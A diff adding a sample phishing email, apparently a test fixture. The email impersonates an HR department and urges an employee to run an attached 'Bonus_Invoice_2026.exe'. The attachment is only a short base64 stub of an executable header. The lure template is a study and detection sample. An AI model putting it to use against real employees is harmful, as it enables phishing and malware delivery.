@@ -1,0 +1,20 @@
+From: "HR Department" <hr@company.com>
+To: employee@company.com
+Subject: Urgent: Updated Bonus Invoice
+Date: Fri, 04 Sep 2026 14:14:00 +0000
+Content-Type: multipart/mixed; boundary="----=_NextPart_000_0001"
+
+------=_NextPart_000_0001
+Content-Type: text/plain; charset="utf-8"
+
+Please review the attached invoice executable to claim your Q3 bonus.
+
+------=_NextPart_000_0001
+Content-Type: application/octet-stream; name="Bonus_Invoice_2026.exe"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="Bonus_Invoice_2026.exe"
+
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAA
+
+------=_NextPart_000_0001--
